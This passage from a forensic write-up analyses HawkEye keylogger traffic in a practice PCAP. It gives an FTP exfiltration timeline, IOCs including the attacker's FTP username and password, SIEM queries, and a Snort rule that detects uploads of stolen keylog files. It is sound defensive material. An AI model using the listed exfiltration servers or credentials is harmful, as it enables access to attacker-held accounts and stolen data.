| 21:46:27–21:46:33 | FTP to 145.14.144.10, upload **Keylog_Records_2** (891 B) + **screenshot1** (2.8 MB) |
| 22:01:33–22:01:38 | FTP to 145.14.145.99, upload **Keylog_Records_3** (601 B) + **screenshot2** (2.2 MB) |
| 22:05:23 | Capture ends |

## IOCs { #iocs }

| Type | Value | Note |
|---|---|---|
| Domain | `files.000webhost[.]com` | FTP exfil destination (free hosting) |
| IP | 145.14.145.4, 145.14.144.10, 145.14.145.99 | 000webhost FTP servers |
| FTP account | `snifferzett` / `trible22` | Attacker's account |
| File name pattern | `HawkEye_Keylogger_Stealer_Records_<HOST> <date>.txt`, `HawkEye_Keylogger_Keylog_Records_<n>_<HOST> <date>.txt`, `screenshot<n>_<HOST>.jpeg` | HawkEye upload names |
| Domain | `whatismyipaddress[.]com` | Legitimate service, used for the public IP check |

---

## Copy-ready queries { #query-sheet }

Replace `<case>` with your case name. Drop `pcap_case`/`tags` on a live network.

**Splunk (Zeek)**

```spl
index=zeek pcap_case="<case>" | stats count AS events min(ts) AS first max(ts) AS last BY sourcetype | eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S") | sort - events
index=zeek sourcetype=zeek:dhcp pcap_case="<case>" | eval time=strftime(ts, "%Y-%m-%d %H:%M:%S") | table time client_addr assigned_addr mac host_name domain msg_types
index=zeek sourcetype=zeek:conn pcap_case="<case>" | where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h) | stats count AS conns dc(id_resp_h) AS dests BY id_orig_h | sort - conns
index=zeek sourcetype=zeek:kerberos pcap_case="<case>" | stats count BY id_orig_h id_resp_h client
index=zeek sourcetype=zeek:conn pcap_case="<case>" | stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service | eval first=strftime(first, "%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dns pcap_case="<case>" | stats count values(answers) AS answers min(ts) AS first BY query | eval first=strftime(first, "%H:%M:%S") | sort first
index=zeek sourcetype=zeek:ftp pcap_case="<case>" | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h user command arg reply_code reply_msg
index=zeek sourcetype=zeek:ftp id_orig_h=10.0.0.227 command=STOR
index=zeek sourcetype=zeek:conn id_orig_h=10.0.0.227 id_resp_h IN (145.14.145.4, 145.14.144.10, 145.14.145.99)
```

- `command=STOR` keeps uploads only. `id_resp_h IN (a, b, c)` matches any of the three — the same as three `OR`s.

**Arkime**

```text
tags == <case> && ip.src == 10.0.0.227 && port.dst == 21
tags == <case> && ip.src == 10.0.0.227 && (ip.dst == 145.14.145.4 || ip.dst == 145.14.144.10 || ip.dst == 145.14.145.99)
tags == <case> && ip.src == 10.0.0.227 && port.dst == 37280
tags == <case> && user == snifferzett
huntName == hawkeye_ftp
```

**Snort**

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:"HawkEye Keylogger FTP upload - Sung"; content:"HawkEye_Keylogger"; nocase; sid:1000021; rev:1;)
```

---

## Lessons { #lessons }

1. **The log-type list is already a clue.** FTP on an office PC with no TLS at all pointed straight at the exfil channel.
2. **DHCP INFORM has no assigned address.** Take the IP from `conn`, the name and MAC from DHCP.
3. **Bytes sent vs received tell the direction.** `ftp-data` with megabytes sent and 0 received = upload.
4. **PASV arithmetic links files to sizes.** p1 × 256 + p2 = the `ftp-data` port.
5. **Zeek pairs a command with the last reply.** Check the raw session before calling an upload failed.
6. **Clear-text protocols hand you the evidence.** FTP showed the attacker's account and every stolen file.
7. **Name the family carefully.** "HawkEye" comes from file names the malware itself wrote — strong, but still not a sample analysis.
8. **Keep victim passwords out of reports.** Write "see evidence".

## References { #references }

- [Night Dew — pcapbox setup and Snort test guide](night-dew-hancitor-pony-zeus-panda-tls-c2.md)
- [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
- [Zeek logs](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md)
- [Playbook: data exfiltration](../playbooks/data-exfiltration.md) · [Playbook: account compromise](../playbooks/account-compromise.md)
- Original exercise: [malware-traffic-analysis.net — 2019-05-02 BEGUILESOFT](https://malware-traffic-analysis.net/2019/05/02/index.html)
